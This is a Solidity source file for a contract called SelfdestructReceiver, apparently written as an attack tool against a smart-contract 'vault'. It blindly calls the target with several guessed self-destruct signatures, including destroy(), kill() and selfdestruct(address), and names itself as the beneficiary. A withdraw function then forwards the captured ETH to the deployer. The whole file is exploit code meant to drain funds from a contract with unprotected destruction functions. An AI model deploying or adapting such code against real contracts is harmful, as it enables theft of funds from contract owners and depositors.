// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title SelfdestructReceiver
 * @notice Contract to receive ETH from selfdestruct
 * @dev Attempts to trigger vault selfdestruct and capture ETH
 */
contract SelfdestructReceiver {
    address payable public owner;
    
    constructor() {
        owner = payable(msg.sender);
    }
    
    receive() external payable {}
    
    function triggerVaultDestruct(address vault) external {
        // Try to trigger selfdestruct and receive funds
        (bool s1,) = vault.call(abi.encodeWithSignature("destroy()"));
        (bool s2,) = vault.call(abi.encodeWithSignature("kill()"));
        (bool s3,) = vault.call(abi.encodeWithSignature("destruct(address)", address(this)));
        (bool s4,) = vault.call(abi.encodeWithSignature("selfdestruct(address)", address(this)));
        
        // Try with implementation
        (bool s5,) = vault.call(abi.encodeWithSignature("destroy(address)", address(this)));
    }
    
    function withdraw() external {
        owner.transfer(address(this).balance);
    }
}
